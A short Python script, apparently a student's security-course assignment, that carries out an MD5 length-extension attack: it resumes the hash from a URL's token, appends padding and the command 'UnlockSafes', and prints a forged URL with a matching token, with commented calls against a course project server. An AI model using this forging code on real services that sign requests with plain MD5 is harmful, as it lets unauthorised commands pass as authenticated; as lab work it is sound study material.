# -*- coding: utf-8 -*-
"""
Created on Thu Feb 11 09:08:12 2021

@author: Christopher

"""
from urllib.parse import urlparse, quote
from pymd5 import md5, padding
import sys


def len_ext_attack(url):
    #break URL into its useful components 
    website = url[:url.find("=")+1]
    currToken = url[url.find("=")+1:url.find("&")]
    message = url[url.find("&")+1:]
    
    #To find the padded message length, guess the length of m and run bits
    messageLength = len(message) + 8 # assuming 8 bytes due to assignment
    bits = (messageLength + len(padding(messageLength *8)))*8
    
    h = md5(state=bytes.fromhex(currToken), count=bits)
    x = "&command=UnlockSafes"
    h.update(x)
    newToken = h.hexdigest()
    
    messagePadding = quote(padding(messageLength*8))
    newMessage = message + messagePadding + x
    
    url = website + newToken + "&" + newMessage
    print(url)


#len_ext_attack('https://project1.ecen4133.org/chgo7806/lengthextension/api?token=a0345fa6f368175075b7da589835c3b6&command=Test1&command=GradeProject&command=NoOp')
#len_ext_attack('https://project1.ecen4133.org/chgo7806/lengthextension/api?token=a633b4c6552d740a4d4900ec6087aa17&command=VeryLongCommandThatMightTakeUpMultipleBlocksAndFindSolutionsThatIncorrectlyCountBits')
#len_ext_attack('https://project1.ecen4133.org/chgo7806/lengthextension/api?token=baec4f632e7a6ad1abf2dfdcca724b17&command=SprinklersPowerOn')
#len_ext_attack('https://project1.ecen4133.org/chgo7806/lengthextension/api?token=70a3add40f3d84e8fd98f563cc91e3e5&command=ClockPowerOff&command=NoOp&command=ClockPowerOn')
len_ext_attack(str(sys.argv[1]))
